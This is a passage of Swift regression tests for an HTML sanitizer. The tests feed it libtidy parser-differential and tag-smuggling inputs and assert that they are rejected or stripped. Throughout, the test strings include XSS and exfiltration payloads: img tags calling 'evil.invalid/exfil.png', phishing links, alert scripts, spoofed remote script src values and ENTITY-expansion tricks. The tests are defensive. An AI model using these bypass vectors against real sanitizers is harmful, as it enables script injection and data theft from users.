            // <div a=b<math><mi>x</mi></math> must NOT drop <math>
            do {
                let docMath = try LibraryService.htmlDocumentPreservingMath("<!doctype html><html><body><div a=b<math><mi>x</mi></math><p>ok</p></div></body></html>")
                try require((try docMath.nodes(forXPath: "//*[local-name()='math']")).count == 1, "Wave 6 R10: <div a=b<math> must preserve <math>")
            }
            // Wave 6 R11 regressions: all 8 live-probed libtidy differentials & smuggling vectors blocked
            // R11 #1: 2-stage deletion-gluing XML/ENTITY smuggling, unclosed-tag + stripped <script>, unclosed <textarea> merge
            do {
                let smuggle = "<<scr<script></script>ipt></script>?xml version=\"1.0\"?><<scr<script></script>ipt></script>!DOCTYPE html [<<scr<script></script>ipt></script>!ENTITY pwn \"EXPANDED_ENTITY\">]><html><body><div id=\"article-body\" class=\"post-content\"><scr<scr<script></script>ipt></script>ipt><a title=\"</script><img src='https://evil.invalid/exfil.png'><div data-citation-record='{&quot;paperKey&quot;:&quot;arxiv:9999.99999&quot;}'></div>\">safe</a><p>&pwn;</p></div></body></html>"
                let rwSmuggle = LibraryService.rewriteHTML5TagsForTidy(smuggle, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                try require(!LibraryService.asciiCaseInsensitiveContains(rwSmuggle, "<?xml"), "Wave 6 R11 #1a: deletion-gluing must not synthesize <?xml")
                try require(!LibraryService.asciiCaseInsensitiveContains(rwSmuggle, "<!ENTITY"), "Wave 6 R11 #1a: deletion-gluing must not synthesize <!ENTITY")
                try require(!LibraryService.asciiCaseInsensitiveContains(rwSmuggle, "<script"), "Wave 6 R11 #1a: deletion-gluing must not synthesize <script>")
                var parsedSmuggle: XMLDocument? = nil
                do {
                    parsedSmuggle = try LibraryService.htmlDocumentPreservingMath(rwSmuggle)
                } catch {
                    parsedSmuggle = nil
                }
                if let doc = parsedSmuggle {
                    let pText = (try doc.nodes(forXPath: "//p")).compactMap { $0.stringValue }.joined()
                    try require(!pText.contains("EXPANDED_ENTITY"), "Wave 6 R11 #1a: <p> text must never contain expanded entity")
                    try require((try doc.nodes(forXPath: "//script")).isEmpty, "Wave 6 R11 #1a: live script must not survive")
                    try require((try doc.nodes(forXPath: "//img")).isEmpty, "Wave 6 R11 #1a: glued <script> must not unleash <img> from attribute")
                    try require((try doc.nodes(forXPath: "//*[@data-citation-record]")).isEmpty, "Wave 6 R11 #1a: glued <script> must not unleash citation div from attribute")
                }
                for (label, html) in [
                    ("R11 #1b unclosed-div-script", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div a=1 <script></script>b=\"x><p title=\"><figure><div data-citation-record='{&quot;paperKey&quot;:&quot;arxiv:9999.99999&quot;}'></div><img src='https://evil.invalid/exfil.png'><a href='https://evil.invalid/phish'>CLICK</a></figure>\">innocent</p></div></body></html>"),
                    ("R11 #1c unclosed-textarea", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><textarea a=1 <b=\"x></textarea><p title=\"><figure><div data-citation-record='{&quot;paperKey&quot;:&quot;arxiv:9999.99999&quot;}'></div><img src='https://evil.invalid/exfil.png'><a href='https://evil.invalid/phish'>CLICK</a></figure>\">innocent</p></div></body></html>"),
                    ("R11 #3a script-bang", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><script!><a title=\"</script><p title=\"><figure><div data-citation-record='{&quot;paperKey&quot;:&quot;arxiv:9999.99999&quot;}'></div><img src='https://evil.invalid/exfil.png'><math><mi>SPOOFED</mi></math></figure>\">innocent</p></div></body></html>"),
                    ("R11 #3b script-utf8", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><script中>alert(1)</script><p>ok</p></div></body></html>"),
                    ("R11 #3c div-bang-eq", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div!=\"x><p title=\"><figure><div data-citation-record='{&quot;paperKey&quot;:&quot;arxiv:9999.99999&quot;}'></div><img src='https://evil.invalid/exfil.png'><math><mi>SPOOFED</mi></math></figure>\">innocent</p></div></body></html>"),
                    ("R11 #3d div-lt-attr", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div<a=\"x><figure><div data-citation-record='{&quot;paperKey&quot;:&quot;arxiv:9999.99999&quot;}'></div><img src='https://evil.invalid/exfil.png'></figure>\">innocent</div></body></html>"),
                    ("R11 #4a script-attr-slash", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><script a/><a title=\"</script><p title=\"><figure><div data-citation-record='{&quot;paperKey&quot;:&quot;arxiv:9999.99999&quot;}'></div><img src='https://evil.invalid/exfil.png'><math><mi>SPOOFED</mi></math></figure>\">innocent</p></div></body></html>"),
                    ("R11 #4b script-double-slash", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><script //>alert(1)</script><p>ok</p></div></body></html>"),
                    ("R11 #4c div-slash-eq", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div /=\"x><figure><div data-citation-record='{&quot;paperKey&quot;:&quot;arxiv:9999.99999&quot;}'></div><img src='https://evil.invalid/exfil.png'></figure>\">innocent</div></body></html>"),
                    ("R11 #4c div-a-slash-eq", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div a/=\"x><figure><div data-citation-record='{&quot;paperKey&quot;:&quot;arxiv:9999.99999&quot;}'></div><img src='https://evil.invalid/exfil.png'></figure>\">innocent</div></body></html>"),
                    ("R11 #4d script-unquoted-selfclose", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><script a=b/><p title=\"><figure><div data-citation-record='{&quot;paperKey&quot;:&quot;arxiv:9999.99999&quot;}'></div><img src='https://evil.invalid/exfil.png'></figure>\">innocent</p></script></div></body></html>"),
                    ("R11 #5 server-cdata", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><server><a title=\"</server><p title=\"><figure><div data-citation-record='{&quot;paperKey&quot;:&quot;arxiv:9999.99999&quot;}'></div><img src='https://evil.invalid/exfil.png'><math><mi>SPOOFED</mi></math></figure>\">innocent</p></div></body></html>")
                ] {
                    let rw = LibraryService.rewriteHTML5TagsForTidy(html, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                    try require(!rw.contains("data-m=\"figure\""), "Wave 6 \(label): must not rewrite figure inside attribute")
                    let doc = try LibraryService.htmlDocumentPreservingMath(rw)
                    try require((try doc.nodes(forXPath: "//img")).isEmpty, "Wave 6 \(label): must not inject <img>")
                    try require((try doc.nodes(forXPath: "//script")).isEmpty, "Wave 6 \(label): must not leave live <script>")
                    try require((try doc.nodes(forXPath: "//*[@data-citation-record]")).isEmpty, "Wave 6 \(label): must not inject citation")
                    try require((try doc.nodes(forXPath: "//*[local-name()='math']")).isEmpty, "Wave 6 \(label): must not inject <math>")
                }
            }
            // R11 #2 & #6: lowercase <![cdata[, SGML marked sections, and unquoted '<' attribute values rejected fail-closed
            for (label, html) in [
                ("R11 #2a lowercase cdata", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><![cdata[ ]><img src=\"https://evil.invalid/exfil.png\"><script>alert(1)</script>]]></div></body></html>"),
                ("R11 #2c marked-section-short", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><![a> <p title=\" ]><figure>IN</figure>\"></div></body></html>"),
                ("R11 #2c marked-section-long", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><![\(String(repeating: "a", count: 65))[ > <a title=\" ]><p title=\"><figure>IN</figure>\"></div></body></html>"),
                ("R11 #6a unquoted a=<>", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div a=<> b=\"x><p title=\"><figure><img src='https://evil.invalid/exfil.png'></figure>\">innocent</p></div></body></html>"),
                ("R11 #6b unquoted a=< ", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div a=< b=\"x><p title=\"><figure><img src='https://evil.invalid/exfil.png'></figure>\">innocent</p></div></body></html>")
            ] {
                let rw = LibraryService.rewriteHTML5TagsForTidy(html, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                try require(!rw.contains("data-m=\"figure\""), "Wave 6 \(label): rewriteHTML5TagsForTidy must not desync")
                var rejected = false
                do { _ = try LibraryService.htmlDocumentPreservingMath(rw) } catch { rejected = true }
                try require(rejected, "Wave 6 \(label): htmlDocumentPreservingMath must reject fail-closed")
            }
            // R11 #7: spoofed JSON citation script open tags rejected by byte-parsed isJSONCitationScriptOpenTag
            for spoofScript in [
                "<script data-x=' type=\"application/json\" class=\"paper-tools__citation-record\" '>",
                "<script type=\"application/json\" class=\"evil-paper-tools__citation-record-fake\">",
                "<script/src=\"https://evil.invalid/a.js\" type=\"application/json\" class=\"paper-tools__citation-record\">",
                "<script src=\"https://evil.invalid/a.js\" type=\"application/json\" class=\"paper-tools__citation-record\">"
            ] {
                let b = Array(spoofScript.utf8)
                try require(!LibraryService.isJSONCitationScriptOpenTag(b[...]), "Wave 6 R11 #7: must reject spoofed citation tag \(spoofScript)")
            }
            do {
                let validCit = Array("<script type=\"application/json\" class=\"foo paper-tools__citation-record\">".utf8)
                try require(LibraryService.isJSONCitationScriptOpenTag(validCit[...]), "Wave 6 R11 #7: must accept valid Hugo citation script tag")
            }
            // R11 #8: ASCII POSIX case-insensitive helper works regardless of locale
            try require(LibraryService.asciiCaseInsensitiveContains("<!entity x>", "<!ENTITY"), "Wave 6 R11 #8: POSIX ASCII entity match")
            try require(LibraryService.asciiCaseInsensitiveContains("JAVASCRIPT:alert(1)", "javascript:"), "Wave 6 R11 #8: POSIX ASCII javascript match")
            // Wave 6 R12 regressions:
            // R12 #1: live libtidy consumes `<<` and `</<` without ungetting the trailing `<`
            for (label, html) in [
                ("R12 #1a double-lt-p", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><<p title=\"><figure><img src='https://evil.invalid/exfil.png'><div data-citation-record='{&quot;paperKey&quot;:&quot;arxiv:9999.99999&quot;}'></div></figure>\">ok</div></body></html>"),
                ("R12 #1b quad-lt-p", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><<<<p title=\"><figure><img src='https://evil.invalid/exfil.png'></figure>\">ok</div></body></html>"),
                ("R12 #1c end-triple-lt-p", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"></<<<p title=\"><figure><img src='https://evil.invalid/exfil.png'></figure>\">ok</div></body></html>"),
                ("R12 #1d double-lt-script", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><<script><p title=\"</script><figure><img src='https://evil.invalid/exfil.png'></figure>\">ok</p></div></body></html>")
            ] {
                let rw = LibraryService.rewriteHTML5TagsForTidy(html, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                let doc = try LibraryService.htmlDocumentPreservingMath(rw)
                if label == "R12 #1a double-lt-p" || label == "R12 #1b quad-lt-p" || label == "R12 #1c end-triple-lt-p" {
                    // Since libtidy treats `<<p` / `<<<<p` / `</<<<p` as literal text (NOT a `<p>` tag), `<figure>` IS live in libtidy and MUST be preserved identically by rewriteHTML5TagsForTidy.
                    try require(rw.contains("data-m=\"figure\""), "Wave 6 \(label): scanner must stay synced with libtidy when << suppresses <p>")
                } else {
                    // `<<script>` does NOT open CDATA in libtidy; scanner must NOT eat `</script>` and must keep `<figure>` inside `<p title="...">` inert.
                    try require(!rw.contains("data-m=\"figure\""), "Wave 6 \(label): <<script> must not enter raw text mode")
                    try require((try doc.nodes(forXPath: "//img")).isEmpty, "Wave 6 \(label): must not inject <img>")
                }
            }
            // R12 #2: inline PHP/ASP/JSTE (`<?`, `<%`, `<#`) inside start-tag attributes rejected fail-closed
            for (label, html) in [
                ("R12 #2a div-space-php", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div <? x><p title=\" ?> <script>alert(1)</script><figure><img src='https://evil.invalid/exfil.png'></figure>\">ok</p></div></body></html>"),
                ("R12 #2b div-short-php", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div <?= x><p title=\" ?> <script>alert(1)</script><figure><img src='https://evil.invalid/exfil.png'></figure>\">ok</p></div></body></html>"),
                ("R12 #2c div-attr-php", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div a<? x><p title=\" ?> <script>alert(1)</script><figure><img src='https://evil.invalid/exfil.png'></figure>\">ok</p></div></body></html>"),
                ("R12 #2d div-lt-php", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div<<? x><p title=\" ?> <script>alert(1)</script><figure><img src='https://evil.invalid/exfil.png'></figure>\">ok</p></div></body></html>"),
                ("R12 #2e div-asp", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div a=b<% x><p title=\" %> <script>alert(1)</script><figure><img src='https://evil.invalid/exfil.png'></figure>\">ok</p></div></body></html>"),
                ("R12 #2f div-jste", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div <# x><p title=\" #> <script>alert(1)</script><figure><img src='https://evil.invalid/exfil.png'></figure>\">ok</p></div></body></html>")
            ] {
                let rw = LibraryService.rewriteHTML5TagsForTidy(html, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                try require(!rw.contains("data-m=\"figure\""), "Wave 6 \(label): rewriteHTML5TagsForTidy must abort before desync")
                var rejected = false
                do { _ = try LibraryService.htmlDocumentPreservingMath(rw) } catch { rejected = true }
                try require(rejected, "Wave 6 \(label): htmlDocumentPreservingMath must reject fail-closed")
            }
            // R12 #3: unclosed RCDATA/plaintext ending in '/' must not synthesize self-closing '/>'
            do {
                let taHTML = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><textarea a=b/<p>HIDDEN</p></textarea></div></body></html>"
                let rwTa = LibraryService.rewriteHTML5TagsForTidy(taHTML, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                let docTa = try LibraryService.htmlDocumentPreservingMath(rwTa)
                let taText = (try docTa.nodes(forXPath: "//textarea")).first?.stringValue ?? ""
                try require(taText.contains("<p>HIDDEN</p>"), "Wave 6 R12 #3a: unclosed <textarea a=b/<p> must stay open and keep escaped body inside textarea")
                try require((try docTa.nodes(forXPath: "//p")).isEmpty, "Wave 6 R12 #3a: body inside <textarea a=b/<p> must not leak out as live <p>")

                let ptHTML = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><plaintext a=b/<p>TEXT</p></div></body></html>"
                let rwPt = LibraryService.rewriteHTML5TagsForTidy(ptHTML, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                let docPt = try LibraryService.htmlDocumentPreservingMath(rwPt)
                let ptText = (try docPt.nodes(forXPath: "//pre")).first?.stringValue ?? ""
                try require(ptText.contains("<p>TEXT</p>"), "Wave 6 R12 #3b: unclosed <plaintext a=b/<p> must stay open and keep escaped body inside plaintext/pre")
                try require((try docPt.nodes(forXPath: "//p")).isEmpty, "Wave 6 R12 #3b: body inside <plaintext a=b/<p> must not leak out as live <p>")
            }
            // Wave 6 R13 regressions:
            // R13 #1: AFTER_ATTR_NAME quote-as-equals (`"` / `'`) recovery matches live libtidy
            for (label, html) in [
                ("R13 #1a dbl-dbl", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div a \"\"x><p title=\"><script>var x=1;</script><span id=HIT>L</span>\">ok</p></div></body></html>"),
                ("R13 #1b sgl-sgl", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div a ''x><p title='><script>var x=1;</script><span id=HIT>L</span>'>ok</p></div></body></html>"),
                ("R13 #1c dbl-sp-dbl", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div a \" \"x><p title=\"><script>var x=1;</script><span id=HIT>L</span>\">ok</p></div></body></html>"),
                ("R13 #1d dbl-sgl", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div a \"'x><p title='><script>var x=1;</script><span id=HIT>L</span>'>ok</p></div></body></html>"),
                ("R13 #1e sgl-dbl", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div a '\"x><p title=\"><script>var x=1;</script><span id=HIT>L</span>\">ok</p></div></body></html>"),
                ("R13 #1f rev-dbl", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div a \"b=\"x><script>var x=1;</script><span id=HIT>L</span>\">ok</div></body></html>"),
                ("R13 #1g rev-sgl", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div a 'b=\"x><script>var x=1;</script><span id=HIT>L</span>\">ok</div></body></html>"),
                ("R13 #1h fig-breakout", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div a \"b=\"x><p title=\"><figure id=CANARY_FIG><span id=HIT>L</span></figure>\">ok</p></div></body></html>")
            ] {
                let rw = LibraryService.rewriteHTML5TagsForTidy(html, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                let doc = try LibraryService.htmlDocumentPreservingMath(rw)
                try require((try doc.nodes(forXPath: "//script")).isEmpty, "Wave 6 \(label): must strip live <script>")
                if label == "R13 #1h fig-breakout" {
                    try require(!rw.contains("data-m=\"figure\""), "Wave 6 \(label): must not rewrite <figure> inside title attribute")
                    try require((try doc.nodes(forXPath: "//span[@id='HIT']")).isEmpty, "Wave 6 \(label): must not shatter title attribute")
                }
            }
            for (label, html) in [
                ("R13 #1i unquoted-lt", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div a \"<> b=\"x><p title=\"><figure id=CANARY_FIG><span id=HIT>L</span></figure>\">ok</p></div></body></html>"),
                ("R13 #1l unclosed-sgl-after-dbl", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div a \"'x><p title=\"><script>var x=1;</script>\">ok</p></div></body></html>"),
                ("R13 #2e hyphen-unquoted-lt", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div a-\"<> b=\"x><p title=\"><figure id=CANARY_FIG><span id=HIT>L</span></figure>\">ok</p></div></body></html>")
            ] {
                let rw = LibraryService.rewriteHTML5TagsForTidy(html, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                try require(!rw.contains("data-m=\"figure\""), "Wave 6 \(label): rewriteHTML5TagsForTidy must abort fail-closed")
                var rejected = false
                do { _ = try LibraryService.htmlDocumentPreservingMath(rw) } catch { rejected = true }
                try require(rejected, "Wave 6 \(label): htmlDocumentPreservingMath must reject fail-closed")
            }
            do {
                let selfCloseScript = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><script a \"x/><p>AFTER</p></div></body></html>"
                let rwS = LibraryService.rewriteHTML5TagsForTidy(selfCloseScript, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                let docS = try LibraryService.htmlDocumentPreservingMath(rwS)
                try require((try docS.nodes(forXPath: "//script")).isEmpty, "Wave 6 R13 #1j: self-closing <script a \"x/> must be stripped")
                try require((try docS.nodes(forXPath: "//p")).first?.stringValue?.trimmingCharacters(in: .whitespacesAndNewlines) == "AFTER", "Wave 6 R13 #1j: <script a \"x/> must not swallow following <p>")

                let selfCloseTa = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><textarea a \"x/><p>VISIBLE</p></div></body></html>"
                let rwT = LibraryService.rewriteHTML5TagsForTidy(selfCloseTa, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                let docT = try LibraryService.htmlDocumentPreservingMath(rwT)
                try require((try docT.nodes(forXPath: "//p")).first?.stringValue?.trimmingCharacters(in: .whitespacesAndNewlines) == "VISIBLE", "Wave 6 R13 #1k: self-closing <textarea a \"x/> must not swallow following <p>")
            }
            // R13 #2: leading and in-name hyphen-quote (`-"` / `-'`) rules match live libtidy
            for (label, html) in [
                ("R13 #2a lead-div-dbl", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div -\"b=\"x><script>var x=1;</script><span id=HIT>L</span>\">ok</div></body></html>"),
                ("R13 #2b lead-div-sgl", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div -'b=\"x><script>var x=1;</script><span id=HIT>L</span>\">ok</div></body></html>"),
                ("R13 #2c lead-after-attr", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div a=\"1\"-\"b=\"x><script>var x=1;</script><span id=HIT>L</span>\">ok</div></body></html>"),
                ("R13 #2d lead-plaintext", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><plaintext -\"b=\"x><script>var x=1;</script><span id=HIT>L</span>\">ok</div></body></html>"),
                ("R13 #2f lead-xmp", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><xmp -\"b=\"x><script>var x=1;</script><span id=HIT>L</span>\">ok</xmp></div></body></html>"),
                ("R13 #2g inname-dbl-dbl", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div a-\"\"x><p title=\"><script>var x=1;</script><span id=HIT>L</span>\">ok</p></div></body></html>"),
                ("R13 #2h inname-sgl-sgl", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div a-''x><p title='><script>var x=1;</script><span id=HIT>L</span>'>ok</p></div></body></html>"),
                ("R13 #2i inname-dash-dash", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div --\"\"x><p title=\"><script>var x=1;</script><span id=HIT>L</span>\">ok</p></div></body></html>"),
                ("R13 #2j inname-slash-dash", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div /-\"\"x><p title=\"><script>var x=1;</script><span id=HIT>L</span>\">ok</p></div></body></html>"),
                ("R13 #2k inname-rev", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div a-\"b=\"x><script>var x=1;</script><span id=HIT>L</span>\">ok</div></body></html>")
            ] {
                let rw = LibraryService.rewriteHTML5TagsForTidy(html, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                let doc = try LibraryService.htmlDocumentPreservingMath(rw)
                try require((try doc.nodes(forXPath: "//script")).isEmpty, "Wave 6 \(label): must not emit live <script>")
                if label == "R13 #2d lead-plaintext" || label == "R13 #2f lead-xmp" {
                    try require((try doc.nodes(forXPath: "//span[@id='HIT']")).isEmpty, "Wave 6 \(label): body inside plaintext/xmp must stay escaped")
                }
            }
            do {
                let taHyphen = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><textarea -\"<p>HIDDEN</p></textarea></div></body></html>"
                let rwTH = LibraryService.rewriteHTML5TagsForTidy(taHyphen, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                let docTH = try LibraryService.htmlDocumentPreservingMath(rwTH)
                try require((try docTH.nodes(forXPath: "//p")).isEmpty, "Wave 6 R13 #2l: <textarea -\"<p>HIDDEN</p> must keep body escaped")
                let styleHrefHyphen = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><style href-\"http://x/>body{color:red}</style><p>AFTER</p></div></body></html>"
                let rwSH = LibraryService.rewriteHTML5TagsForTidy(styleHrefHyphen, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                let docSH = try LibraryService.htmlDocumentPreservingMath(rwSH)
                try require((try docSH.nodes(forXPath: "//style")).isEmpty, "Wave 6 R13 #2m: <style href-\"http://x/> must strip style")
                try require((try docSH.nodes(forXPath: "//p")).first?.stringValue?.trimmingCharacters(in: .whitespacesAndNewlines) == "AFTER", "Wave 6 R13 #2m: <style href-\"http://x/> keeps URL attr open until </style>")
                let scriptHyphenSelf = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><script a-\"x/><p>AFTER2</p></div></body></html>"
                let rwSS = LibraryService.rewriteHTML5TagsForTidy(scriptHyphenSelf, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                let docSS = try LibraryService.htmlDocumentPreservingMath(rwSS)
                try require((try docSS.nodes(forXPath: "//script")).isEmpty, "Wave 6 R13 #2n: <script a-\"x/> must strip script")
                try require((try docSS.nodes(forXPath: "//p")).first?.stringValue?.trimmingCharacters(in: .whitespacesAndNewlines) == "AFTER2", "Wave 6 R13 #2n: <script a-\"x/> self-closes without eating <p>")
            }
            // R13 #3: isJSONCitationScriptOpenTag fails closed on malformed quote-as-equals / hyphen-quote syntax
            for spoofR13 in [
                "<script a \"b=\" src=\"https://evil.invalid/x.js\" type=\"application/json\" class=\"paper-tools__citation-record\">",
                "<script a-\"b=\" src=\"https://evil.invalid/x.js\" type=\"application/json\" class=\"paper-tools__citation-record\">",
                "<script a \"\" type=\"application/json\" class=\"paper-tools__citation-record\" \">",
                "<script -\" type=\"application/json\" class=\"paper-tools__citation-record\">",
                "<script type=\"application/json\"class=\"paper-tools__citation-record\">"
            ] {
                let b = Array(spoofR13.utf8)
                try require(!LibraryService.isJSONCitationScriptOpenTag(b[...]), "Wave 6 R13 #3: must reject malformed citation script tag \(spoofR13)")
            }
            // R14 #1: Apple libtidy 8-bit ParseTagName truncation on (cp & 0xFF) ∈ {0x2F, 0x3E, 0xFF} fails closed
            for (label, html) in [
                ("R14 #1a start-013E-div", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div\u{013E}a=\"x><script>var x=1;</script><img src='https://evil.invalid/exfil.png'>\">ok</div></div></body></html>"),
                ("R14 #1b start-4E3E-plaintext", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><plaintext\u{4E3E}a=\"x><script>var x=1;</script>\">ok</div></body></html>"),
                ("R14 #1c start-1F63E-script", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><script\u{1F63E}/><figure><span id=HIT>L</span></figure></script></div></body></html>"),
                ("R14 #1d start-012F-div", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><div\u{012F}=\"x><p title=\"><script>var x=1;</script><img src='https://evil.invalid/exfil.png'>\">ok</div></div></body></html>"),
                ("R14 #1e start-012F-script", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><script\u{012F}><p title=\"</script><img src='https://evil.invalid/exfil.png'>\">ok</p></div></body></html>"),
                ("R14 #1f end-00FF-div", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"></div\u{00FF}><p title=\"><script>var x=1;</script>\">ok</p></div></body></html>"),
                ("R14 #1g end-mid-00FF", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"></div\u{00FF}a\u{00FF}><p title=\"><script>var x=1;</script>\">ok</p></div></body></html>"),
                ("R14 #1h rcdata-end-FEFF", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><textarea>safe</textarea\u{FEFF}><p title=\"><script>var x=1;</script>\">ok</p></div></body></html>"),
                ("R14 #1i rcdata-end-013E-noclose", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><textarea>safe</textarea\u{013E}<script>var x=1;</script></textarea></div></body></html>"),
                ("R14 #1j script-end-013E", "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><script>var a=1;</script\u{013E}<img src='https://evil.invalid/exfil.png'></script></div></body></html>")
            ] {
                let rw = LibraryService.rewriteHTML5TagsForTidy(html, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                try require(!rw.contains("data-m=\"figure\""), "Wave 6 \(label): rewriteHTML5TagsForTidy must abort fail-closed")
                var rejected = false
                do { _ = try LibraryService.htmlDocumentPreservingMath(rw) } catch { rejected = true }
                try require(rejected, "Wave 6 \(label): htmlDocumentPreservingMath must reject fail-closed")
            }
            // R14 #1k: preserve R11 #3b non-colliding non-ASCII delimiter `<script中>` (U+4E2D, lo=0x2D)
            do {
                let cjkScript = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><script\u{4E2D}>var x=1;</script><p>SAFE_CJK</p></div></body></html>"
                let rw = LibraryService.rewriteHTML5TagsForTidy(cjkScript, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                let doc = try LibraryService.htmlDocumentPreservingMath(rw)
                try require((try doc.nodes(forXPath: "//script")).isEmpty, "Wave 6 R14 #1k: <script中> must still strip script")
                try require((try doc.nodes(forXPath: "//p")).first?.stringValue?.trimmingCharacters(in: .whitespacesAndNewlines) == "SAFE_CJK", "Wave 6 R14 #1k: <script中> must keep following text")
            }
            // R14 #2: isJSONCitationScriptOpenTag fails closed on duplicate attrs and trailing bare '='
            for spoofR14 in [
                "<script type=\"application/json\" type=\"text/javascript\" class=\"paper-tools__citation-record\">",
                "<script type=\"application/json\" class=\"paper-tools__citation-record\" class=\"other\">",
                "<script type=\"application/json\" class=\"paper-tools__citation-record\" type>",
                "<script type=\"application/json\" class=\"paper-tools__citation-record\" type=>",
                "<script type=\"application/json\" class=\"paper-tools__citation-record\" foo=>",
                "<script data-a=\"1\" data-a=\"2\" type=\"application/json\" class=\"paper-tools__citation-record\">"
            ] {
                let b = Array(spoofR14.utf8)
                try require(!LibraryService.isJSONCitationScriptOpenTag(b[...]), "Wave 6 R14 #2: must reject duplicate-attr/bare-eq citation script tag \(spoofR14)")
            }
            // R14 #3 (Adjacent 1): verifySafeDesktopArticleHTML rejects 0x0C (\f) and stray '/' attribute separators
            for badFrag in [
                "<p hidden\u{000C}class=\"x\">SECRET</p>",
                "<p hidden/class=\"x\">SECRET</p>",
                "<p hidden/ class=\"x\">SECRET</p>"
            ] {
                var rejected = false
                do { try LibraryService.verifySafeDesktopArticleHTML(badFrag) } catch { rejected = true }
                try require(rejected, "Wave 6 R14 #3: verifySafeDesktopArticleHTML must reject \(badFrag)")
            }
            try LibraryService.verifySafeDesktopArticleHTML("<p hidden class=\"x\">ok</p><br/><img src=\"https://example.com/a.png\"/>")
            // R14 #4 (Adjacent 2): tidyHTMLDocumentSafely rejects XML+ENTITY declarations used by citationFile/metadata fallbacks
            do {
                var rejected = false
                do { _ = try LibraryService.tidyHTMLDocumentSafely("<?xml version=\"1.0\"?><!DOCTYPE html [<!ENTITY x \"EXPANDED\">]><html><body>&x;</body></html>") } catch { rejected = true }
                try require(rejected, "Wave 6 R14 #4: tidyHTMLDocumentSafely must reject <?xml + <!ENTITY>")
            }
            // R15 #1: verifySafeDesktopArticleHTML rejects boolean-attr `/>`, non-void self-closing `/>`, and unquoted trailing-`/` values
            for badSelfClose in [
                "<img src=\"https://example.com/secret.png\" hidden/>",
                "<p hidden/>SECRET</p>",
